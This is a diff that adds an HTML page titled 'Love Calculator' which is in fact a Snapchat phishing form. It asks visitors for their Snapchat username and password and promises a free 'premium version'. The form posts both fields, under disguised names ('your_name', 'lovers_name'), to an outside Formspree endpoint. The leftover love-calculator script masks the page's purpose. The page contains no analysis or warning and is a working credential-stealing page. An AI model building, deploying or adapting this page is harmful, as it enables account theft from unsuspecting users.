@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Calculator</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #FFFfff;
+            margin: 0;
+        }
+        .container {
+            background-color: #f3ff34;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        h1 {
+            color: #575757;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+            text-align: left;
+        }
+        input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #FFFfff; /* snap yellow */
+            color: #333200;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #ffff00; /* Yellow */
+        }
+        #result {
+            margin-top: 25px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffb600; /* Deep pink */
+        }
+        #note {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>"Please Login Through Your Snapchat Account And Password"</h1>
+        <p id="note">Note: This page will redirects you to your Snapchat app, After clicking "Submit" will give you premium version Enjoy!!</p>
+
+        <form action="https://formspree.io/f/mldnqolg" method="POST" id="loveForm">
+            <label for="name1">Username or Email:</label>
+            <input type="text" id="name1" name="your_name" placeholder="Enter Here" required>
+
+            <label for="name2">Password:</label>
+            <input type="text" id="name2" name="lovers_name" placeholder="Password" required>
+
+            <button type="submit">Submit</button>
+        </form>
+
+        <div id="result"></div>
+    </div>
+
+    <script>
+        document.getElementById('loveForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission for now, as Formspree handles it
+            // We'll add custom JS later if you want a local calculation
+            // event.preventDefault();
+
+            // You can add a fake love calculation here if you want a result immediately
+            // before Formspree redirects. For now, Formspree will handle the redirect.
+            const name1 = document.getElementById('name1').value;
+            const name2 = document.getElementById('name2').value;
+
+            // Simple (fake) love calculation
+            const lovePercentage = Math.floor(Math.random() * 100) + 1;
+            document.getElementById('result').innerText = `You and ${name2} have ${lovePercentage}% love!`;
+
+            // Add a small delay before redirecting for the message to be seen
+            setTimeout(() => {
+                // Formspree will redirect after submission, no need for custom redirect here
+            }, 1500); // Display message for 1.5 seconds
+        });
+    </script>
+</body>
+</html>
